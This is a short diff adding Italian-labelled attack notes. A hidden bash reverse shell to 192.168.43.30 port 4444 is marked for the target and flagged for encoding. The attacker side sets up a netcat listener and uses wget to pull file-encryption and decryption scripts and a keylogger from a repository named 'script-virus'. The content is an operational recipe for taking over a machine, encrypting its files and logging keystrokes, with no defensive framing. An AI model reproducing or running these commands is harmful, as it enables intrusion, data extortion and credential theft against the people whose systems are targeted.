@@ -1,0 +1,13 @@
+target (da codificare):
+			
+		$(nohup bash -i &>/dev/null >& /dev/tcp/192.168.43.30/4444 0>&1) & >/dev/null
+
+attaccante:
+
+		nc -lvp 4444
+
+		wget -O encryptionpsp.sh https://github.com/GiovanniBellorio/script-virus/blob/master/encryptionpsp.sh?raw=true
+		
+		wget -O decryptionpsp.sh https://github.com/GiovanniBellorio/script-virus/blob/master/decryptionpsp.sh?raw=true
+		
+		wget -O keylogger https://github.com/GiovanniBellorio/script-virus/blob/master/keylogger?raw=true
